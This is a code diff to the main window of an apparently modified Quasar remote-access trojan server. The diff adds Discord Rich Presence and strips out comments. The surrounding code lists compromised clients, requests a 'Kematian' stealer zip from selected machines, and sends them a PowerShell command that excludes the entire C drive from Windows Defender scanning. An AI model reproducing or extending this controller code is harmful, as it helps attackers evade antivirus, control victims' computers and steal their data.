@@ -28,6 +28,7 @@ namespace Quasar.Server.Forms
     public partial class FrmMain : Form
     {
         public QuasarServer ListenServer { get; set; }
+        private DiscordRPC.DiscordRPC _discordRpc; // Added DiscordRPC field
 
         private const int STATUS_ID = 4;
         private const int CURRENTWINDOW_ID = 5;
@@ -42,30 +43,24 @@ namespace Quasar.Server.Forms
 
         private PreviewHandler _previewImageHandler;
 
-
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
+            _discordRpc = new DiscordRPC.DiscordRPC(this); // Initialize DiscordRPC
+            _discordRpc.Enabled = true; // Enable DiscordRPC
         }
 
-        /// <summary>
-        /// Registers the client status message handler for client communication.
-        /// </summary>
         private void RegisterMessageHandler()
         {
             MessageHandler.Register(_clientStatusHandler);
             _clientStatusHandler.StatusUpdated += SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
-            //MessageHandler.Register(new GetPreviewImageHandler());
         }
 
-        /// <summary>
-        /// Unregisters the client status message handler.
-        /// </summary>
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_clientStatusHandler);
@@ -111,18 +106,6 @@ namespace Quasar.Server.Forms
             }
             serverCertificate = new X509Certificate2(Settings.CertificatePath);
 #endif
-            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));
-
-            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
-            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
-            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;
-
-            var result = serverCsp.ExportParameters(false);
-            var result2 = connectedCsp.ExportParameters(false);
-
-            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
-                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/
-
             ListenServer = new QuasarServer(serverCertificate);
             ListenServer.ServerState += ServerState;
             ListenServer.ClientConnected += ClientConnected;
@@ -168,7 +151,6 @@ namespace Quasar.Server.Forms
 
         private void FrmMain_Load(object sender, EventArgs e)
         {
-            //SetEqualColumnWidths();
             InitializeServer();
             AutostartListening();
             notifyIcon.Visible = false;
@@ -183,6 +165,7 @@ namespace Quasar.Server.Forms
                 MessageHandler.Unregister(_previewImageHandler);
                 _previewImageHandler.Dispose();
             }
+            _discordRpc.Enabled = false; // Disable DiscordRPC
             notifyIcon.Visible = false;
             notifyIcon.Dispose();
         }
@@ -240,7 +223,6 @@ namespace Quasar.Server.Forms
                 listView1.Items.Add(antivirusItem);
             }
         }
-
 
         private void ServerState(Networking.Server server, bool listening, ushort port)
         {
@@ -348,11 +330,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        /// <summary>
-        /// Sets the tooltip text of the listview item of a client.
-        /// </summary>
-        /// <param name="client">The client on which the change is performed.</param>
-        /// <param name="text">The new tooltip text.</param>
         public void SetToolTipText(Client client, string text)
         {
             if (client == null) return;
@@ -371,17 +348,12 @@ namespace Quasar.Server.Forms
             }
         }
 
-        /// <summary>
-        /// Adds a connected client to the Listview.
-        /// </summary>
-        /// <param name="client">The client to add.</param>
         private void AddClientToListview(Client client)
         {
             if (client == null) return;
 
             try
             {
-                // this " " leaves some space between the flag-icon and first item
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
                     " " + client.EndPoint.Address, client.Value.Tag,
@@ -405,10 +377,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        /// <summary>
-        /// Removes a connected client from the Listview.
-        /// </summary>
-        /// <param name="client">The client to remove.</param>
         private void RemoveClientFromListview(Client client)
         {
             if (client == null) return;
@@ -434,12 +402,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        /// <summary>
-        /// Sets the status of a client.
-        /// </summary>
-        /// <param name="sender">The message handler which raised the event.</param>
-        /// <param name="client">The client to update the status of.</param>
-        /// <param name="text">The new status.</param>
         private void SetStatusByClient(object sender, Client client, string text)
         {
             var item = GetListViewItemByClient(client);
@@ -447,18 +409,11 @@ namespace Quasar.Server.Forms
                 item.SubItems[STATUS_ID].Text = text;
         }
 
-        /// <summary>
-        /// Sets the user status of a client.
-        /// </summary>
-        /// <param name="sender">The message handler which raised the event.</param>
-        /// <param name="client">The client to update the user status of.</param>
-        /// <param name="userStatus">The new user status.</param>
         private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
         {
             var item = GetListViewItemByClient(client);
             if (item != null)
                 item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
-
         }
 
         private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
@@ -468,11 +423,6 @@ namespace Quasar.Server.Forms
                 item.SubItems[CURRENTWINDOW_ID].Text = newWindow;
         }
 
-        /// <summary>
-        /// Gets the Listview item which belongs to the client. 
-        /// </summary>
-        /// <param name="client">The client to get the Listview item of.</param>
-        /// <returns>Listview item of the client.</returns>
         private ListViewItem GetListViewItemByClient(Client client)
         {
             if (client == null) return null;
@@ -488,10 +438,6 @@ namespace Quasar.Server.Forms
             return itemClient;
         }
 
-        /// <summary>
-        /// Gets all selected clients.
-        /// </summary>
-        /// <returns>An array of all selected Clients.</returns>
         private Client[] GetSelectedClients()
         {
             List<Client> clients = new List<Client>();
@@ -511,10 +457,6 @@ namespace Quasar.Server.Forms
             return clients.ToArray();
         }
 
-        /// <summary>
-        /// Displays a popup with information about a client.
-        /// </summary>
-        /// <param name="c">The client.</param>
         private void ShowPopup(Client c)
         {
             try
@@ -523,11 +465,11 @@ namespace Quasar.Server.Forms
                 {
                     if (c == null || c.Value == null) return;
 
-                    notifyIcon.Visible = true; // Temporarily show the task tray icon
+                    notifyIcon.Visible = true;
                     notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                         string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                         c.Value.OperatingSystem), ToolTipIcon.Info);
-                    notifyIcon.Visible = false; // Hide the task tray icon again
+                    notifyIcon.Visible = false;
                 });
             }
             catch (InvalidOperationException)
@@ -770,10 +712,7 @@ namespace Quasar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 var kematianHandler = new KematianHandler(c);
-
                 kematianHandler.RequestKematianZip();
-
-                //kematianHandler.Dispose();
             }
         }
 
@@ -841,7 +780,6 @@ namespace Quasar.Server.Forms
 
         private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
             string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
             DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode };
 
@@ -939,12 +877,10 @@ namespace Quasar.Server.Forms
         {
         }
 
-
         #endregion
 
         private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
-
         }
     }
 }
